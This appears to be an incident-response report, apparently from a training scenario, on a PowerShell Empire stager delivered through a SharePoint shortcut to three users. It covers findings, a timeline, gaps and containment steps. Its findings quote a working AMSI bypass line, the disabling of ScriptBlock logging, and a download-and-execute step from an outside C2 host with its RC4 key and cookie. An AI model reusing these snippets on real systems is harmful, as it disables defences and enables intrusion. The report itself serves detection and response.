brief.headline: PowerShell Empire stager via malicious SharePoint .lnk hit 3 Frothly users (BudStoll, FyodorMalteskesko, AlBungstein) beaconing to 45.77.53.176; AMSI and ScriptBlock logging disabled on initial host.
brief.summary: On 2018-08-20 ~05:28 CST, user BudStoll on BSTOLL-L opened a malicious shortcut 'BRUCE BIRTHDAY HAPPY HOUR PICS (4).lnk' downloaded via Microsoft Edge from frothly-my.sharepoint.com (path /personal/bgist_froth_ly/Documents/Birthday Pictures/BRUCE BIRTHDAY HAPPY HOUR PICS.lnk). browser_broker.exe spawned a Base64-encoded PowerShell one-liner (-noP -sta -w 1 -enc ...). Decoded, it is a textbook Empire stager: it patches System.Management.Automation.Utils cachedGroupPolicySettings to disable ScriptBlockLogging, sets AmsiUtils.amsiInitFailed=true (AMSI bypass), and zeroes the ScriptBlock signatures HashSet. It then RC4-decrypts (key '1AB<Yk6Z4#+vVu%o5}8&M-9UL~l|>0gP') a payload downloaded from https://45.77.53.176:443/admin/get.php with cookie 'PthAVgs=bKQxpuOd5LPCjyfRC1BxPqQ8FWI=' using IE11 UA, and IEX-executes it. The same -enc pattern next appeared on FYODOR-L (FyodorMalteskesko) ~05:32 CST and ABUNGST-L (AlBungstein) ~05:57 CST — indicating the same lure/Empire campaign reached 3 users. On BSTOLL-L, post-exec recon was observed (netstat -nao | findstr LISTENING, wmic os get LocalDateTime, reg query HKLM\...\Uninstall\* enumeration) consistent with Empire situational-awareness modules. No clear lateral pivot via WMI/PSRemoting was observed in the window, and the activity appears to be parallel user compromises rather than host-to-host movement.

findings.title: Empire PowerShell stager launched from Edge browser_broker on BSTOLL-L
findings.evidence: BSTOLL-L 2018-08-20 05:28:40 CST EID 4688: browser_broker.exe -> powershell.exe with '-noP -sta -w 1 -enc <base64>'. Immediately preceded by browser_broker.exe -IOAVHost referencing C:\Users\BudStoll\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\TempState\Downloads\BRUCE BIRTHDAY HAPPY HOUR PICS (4).lnk and https://frothly-my.sharepoint.com/personal/bgist_froth_ly/Documents/Birthday%20Pictures/BRUCE%20BIRTHDAY%20HAPPY%20HOUR%20PICS.lnk.

findings.title: Defense evasion: AMSI bypass + ScriptBlock logging disabled
findings.evidence: Decoded -enc payload sets [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) and zeroes cachedGroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging']/['EnableScriptBlockInvocationLogging'] and ScriptBlock.signatures HashSet.
mitre: T1562.001 Impair Defenses: Disable or Modify Tools

findings.title: C2 beacon: HTTPS to 45.77.53.176/admin/get.php with RC4 staged payload
findings.evidence: Decoded stager DownloadData($ser+'/admin/get.php') where $ser=base64-decoded 'https://45.77.53.176:443'; UA 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'; Cookie 'PthAVgs=bKQxpuOd5LPCjyfRC1BxPqQ8FWI='; RC4 key '1AB<Yk6Z4#+vVu%o5}8&M-9UL~l|>0gP'; cert validation callback set to {$true}; result IEX-executed.
iocs: UA: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko

findings.title: Post-exploitation host reconnaissance on BSTOLL-L
findings.evidence: After the PS launch, repeated cmd.exe spawned netstat -nao | findstr LISTENING, wmic os get LocalDateTime /value, and dozens of reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\* entries (05:43 and 07:25-07:36 CST) — typical Empire Situational_Awareness output.

findings.title: Campaign hit at least three users in parallel
findings.evidence: EID 4688 with powershell -enc pattern: BSTOLL-L/BudStoll first 05:28:40 CST, FYODOR-L/FyodorMalteskesko first 05:32:12 CST, ABUNGST-L/AlBungstein first 05:57:15 CST (epoch first_seen 1534764520/1534764732/1534766235).

timeline.event: Edge browser_broker.exe processes BRUCE BIRTHDAY HAPPY HOUR PICS (4).lnk from frothly-my.sharepoint.com and spawns powershell.exe -enc Empire stager (BudStoll).
Stager disables AMSI/ScriptBlockLogging, fetches https://45.77.53.176:443/admin/get.php, RC4-decrypts and IEX-executes payload.
Same powershell -enc pattern executed by FyodorMalteskesko.
Recon: netstat -nao | findstr LISTENING; wmic os get LocalDateTime.
Same powershell -enc pattern executed by AlBungstein.
Extensive HKLM Uninstall registry enumeration and repeated netstat/wmic recon.

user_agents: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko

scope.stage: Initial access via spearphishing link -> User execution -> Defense evasion (AMSI/SBL bypass) -> C2 (Empire) -> Discovery

gaps: Second-stage payload returned from /admin/get.php was not retrievable from logs (encrypted/in-memory IEX); actual capabilities inferred from Empire's standard agent.
ScriptBlock logging was actively disabled on the compromised hosts, so further PowerShell activity is largely blind.
Network telemetry (proxy/firewall) for outbound connections to 45.77.53.176 was not queried — duration/volume of C2 unknown.
Whether credentials/tokens were harvested or lateral movement attempted after stager success on FYODOR-L/ABUNGST-L was not verified beyond the initial -enc execution.
Source of the malicious .lnk in the SharePoint tenant (which account uploaded it) was not investigated.
recommended_containment: Isolate BSTOLL-L, FYODOR-L, ABUNGST-L from network; collect memory before reboot to capture in-memory Empire agent.
Force password reset + revoke active sessions/tokens for BudStoll, FyodorMalteskesko, AlBungstein (incl. Azure AD/Office 365).
Block egress to 45.77.53.176 at perimeter and add IDS signatures for URI '/admin/get.php' + cookie 'PthAVgs='.
Remove BRUCE BIRTHDAY HAPPY HOUR PICS.lnk from frothly-my.sharepoint.com under bgist_froth_ly; audit that account (likely compromised distribution point) and review who downloaded the file.

Hunt across the fleet for: powershell.exe -enc parents = browser_broker.exe / Office apps; outbound to 45.77.53.176; UA 'Trident/7.0; rv:11.0' from powershell; cookie 'PthAVgs='; cleared/disabled ScriptBlockLogging GPO in-memory.

Re-enable and centrally collect PowerShell ScriptBlock + Module logging via GPO; ensure AMSI providers are functional; deploy Defender ASR rule 'Block all Office apps from creating child processes' and consider blocking PowerShell launches from browser_broker.exe.
Once contained, rebuild the three endpoints from known-good images rather than clean-in-place.
